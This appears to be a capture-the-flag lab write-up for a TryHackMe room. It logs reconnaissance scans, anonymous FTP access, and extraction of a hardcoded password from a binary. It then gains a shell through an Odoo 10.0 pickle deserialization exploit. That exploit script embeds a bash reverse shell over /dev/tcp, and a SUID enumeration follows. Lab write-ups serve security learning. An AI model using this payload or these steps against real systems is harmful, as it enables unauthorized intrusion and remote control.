```bash
```

```bash
```

```bash
```


<h3>Nikto</h3>

```bash
:~/Obscure# nikto -h xx.xxx.xx.xx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    ip-xx-xxx-xx-xx.ec2.internal
+ Target Port:        80
+ Start Time:         2025-08-16 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Werkzeug/0.9.6 Python/2.7.9
+ Cookie session_id created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
```

<h3>Nmap</h3>

```bash
:~/Obscure# nmap -sC -sV -Pn -p- -T4  xx.xxx.xx.xx
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.9)
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```


<h3>dirb</h3>

```bash
:~/Obscure# dirb http://xx.xxx.xx.xx

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 16 xx:xx:xx 2025
URL_BASE: http://xx.xxx.xx.xx/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://xx.xxx.xx.xx/ ----
+ http://xx.xxx.xx.xx/logo (CODE:200|SIZE:13176)                                                                                      
+ http://xx.xxx.xx.xx/web (CODE:303|SIZE:227)                                                                                         
                                                                                                                                       
-----------------
END_TIME: Sat Aug 16 xx:xx:xx 2025
DOWNLOADED: 4612 - FOUND: 2
```

<br>


```bash
:~/Obscure# dirb http://xx.xxx.xx.xx/web/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 16 xx:xx:xx 2025
URL_BASE: http://xx.xxx.xx.xx/web/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://xx.xxx.xx.xx/web/ ----
+ http://xx.xxx.xx.xx/web/login (CODE:200|SIZE:3141)                                                                                  
+ http://xx.xxx.xx.xx/web/report (CODE:302|SIZE:329)                                                                                  
+ http://xx.xxx.xx.xx/web/tests (CODE:302|SIZE:327)                                                                                   
                                                                                                                                       
-----------------
END_TIME: Sat Aug 16 22:00:46 2025
DOWNLOADED: 4612 - FOUND: 3
```

<br>
<h3>FTP</h3>

```bash
:~/Obscure# ftp xx.xxx.xx.xx
Connected to 10.201.114.50.
220 (vsFTPd 3.0.3)
Name (10.201.114.50:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password
226 Directory send OK.
ftp> get notice.txt
local: notice.txt remote: notice.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for notice.txt (134 bytes).
226 Transfer complete.
134 bytes received in 0.00 secs (1.4522 MB/s)
ftp> get password
local: password remote: password
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for password (8856 bytes).
226 Transfer complete.
8856 bytes received in 0.00 secs (61.6477 MB/s)
ftp> exit
221 Goodbye.
```

<br>

```bash
:~/Obscure# file notice.txt
notice.txt: ASCII text
:~/Obscure# cat notice.txt
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```

<br>

```bash
:~/Obscure# file password
password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped
```

<br>

<p>

- SecurePaH<br>
- ssword12H<br>
- 971234596</p>

```bash
:~/Obscure# strings password
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-X
SecurePaH
ssword12H
AWAVA
AUATL
[]A\A]A^A_
971234596
remember this next time '%s'
Incorrect employee id
Password Recovery
Please enter your employee id that is in your email
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
...
```

<br>
<h3>Ghidra</h3>

<p>

- 971234596<br>
- SecurePassword123!</p>

<br>

<img width="1149" height="718" alt="image" src="https://github.com/user-attachments/assets/aeb09ea4-e626-46d2-a467-1aee3bf831da" />


<br>

<img width="786" height="100" alt="image" src="https://github.com/user-attachments/assets/1aae5542-f2b0-4cc0-a361-0fd991216f65" />


<br>

<p>

- SecurePassword123!

<br>

<br>

<h3>/web/login</h3>
<br>

<img width="1130" height="361" alt="image" src="https://github.com/user-attachments/assets/78720187-3d69-4b9b-9835-5838ceaca5f3" />

<br>
<br>


<img width="1078" height="699" alt="image" src="https://github.com/user-attachments/assets/a26bb5d3-860c-4af9-8634-76f4c2754fa4" />


<br>
<br>

<img width="1103" height="515" alt="image" src="https://github.com/user-attachments/assets/e6a2d138-336f-43d3-91fc-c3cb264def24" />


<br>
<br>

<img width="1256" height="561" alt="image" src="https://github.com/user-attachments/assets/0a8b883f-f5b4-48a8-b052-ebcf91b0c5eb" />

<br>
<br>

<img width="1256" height="213" alt="image" src="https://github.com/user-attachments/assets/d7740ffc-0a25-47f9-b15f-cd2922825820" />

<br>
<h3>Exploit</h3>

```bash
:~/Obscure# searchsploit Odoo 10.0
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Odoo CRM 10.0 - Code Execution                                                                        | linux/local/44064.md
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
:~/Obscure# searchsploit -m 44064.md
  Exploit: Odoo CRM 10.0 - Code Execution
      URL: https://www.exploit-db.com/exploits/44064
     Path: /opt/exploitdb/exploits/linux/local/44064.md
    Codes: CVE-2017-10803
```

<p>or</p>

```bash
https://www.exploit-db.com/exploits/44064
```

<br>
<br>

```bash
:~/Obscure# cat exploit.py
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("bash -i >& /dev/tcp/xx.xxx.xx.xxx/4444 0>&1"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

<br>

```bash
:~/Obscure# nano exploit.py
:~/Obscure# python2.7 exploit.py
:~/Obscure# ls
44064.md  exploit.pickle  exploit.py
```



<img width="1255" height="623" alt="image" src="https://github.com/user-attachments/assets/1bbe92c7-f719-4ba5-aade-bfc0e35a0b01" />



<img width="1246" height="204" alt="image" src="https://github.com/user-attachments/assets/95632dfd-e8e4-40de-9c37-400288fd0f53" />



<p>

- clicked Install</p>

<img width="1270" height="351" alt="image" src="https://github.com/user-attachments/assets/6ab43d43-57c1-4e0a-a938-782bdf1b6352" />

<br>

<img width="1247" height="348" alt="image" src="https://github.com/user-attachments/assets/66d53488-b9be-47ee-9806-ae3e6354af6c" />

<br>

<img width="1246" height="389" alt="image" src="https://github.com/user-attachments/assets/7ecb63c7-0d15-4290-80b3-39227ab47ca3" />

<br>
<br>

<img width="1252" height="399" alt="image" src="https://github.com/user-attachments/assets/036604b2-95c2-400e-90df-a69ed3842018" />

```bash



```bash
SHELL=/bin/bash script -q /dev/null
```
/
odoo@b8a9bbf1f380:/$ ccdd  //vvaarr//lliibb//ooddoooo

odoo@b8a9bbf1f380:~$ llss

addons
field_anonymization_main_1.pickle
filestore
flag.txt
sessions
odoo@b8a9bbf1f380:~$ ccaatt  ffllaagg..ttxxtt

THM{1243b64a3a01a8732ccb96217f593520}
odoo@b8a9bbf1f380:~$ ffiinndd  //  --ppeerrmm  --uu==ss  --ttyyppee  ff  22>>//ddeevv//nnuullll

/bin/mount
/bin/umount
/bin/ping
/bin/ping6
/bin/su
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/ret
odoo@b8a9bbf1f380:~$ 

```

```bash
odoo@b8a9bbf1f380:/$ llss  --llaahh

total 88K
drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
-rwxr-xr-x   1 root root    0 Jul 23  2022 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 23  2022 bin
drwxr-xr-x   2 root root 4.0K Jun 14  2018 boot
drwxr-xr-x   5 root root  340 Aug 16 20:18 dev
-rwxrwxr-x   1 root root 1.1K Oct 17  2019 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Jul 23  2022 etc
drwxr-xr-x   2 root root 4.0K Jun 14  2018 home
drwxr-xr-x   1 root root 4.0K Oct 17  2019 lib
drwxr-xr-x   2 root root 4.0K Oct 14  2019 lib64
drwxr-xr-x   2 root root 4.0K Oct 14  2019 media
drwxr-xr-x   1 root root 4.0K Oct 17  2019 mnt
drwxr-xr-x   2 root root 4.0K Oct 14  2019 opt
dr-xr-xr-x 134 root root    0 Aug 16 20:18 proc
-rwsr-xr-x   1 root root 8.7K Jul 23  2022 ret
drwx------   1 root root 4.0K Jul 23  2022 root
drwxr-xr-x   1 root root 4.0K Oct 17  2019 run
drwxr-xr-x   1 root root 4.0K Oct 17  2019 sbin
drwxr-xr-x   2 root root 4.0K Oct 14  2019 srv
dr-xr-xr-x  13 root root    0 Aug 16 20:18 sys
drwxrwxrwt   1 root root 4.0K Aug 16 22:03 tmp
drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
drwxr-xr-x   1 root root 4.0K Oct 14  2019 var

```

```bash
SHELL=/bin/bash script -q /dev/null
```

```bash
```

```bash
```

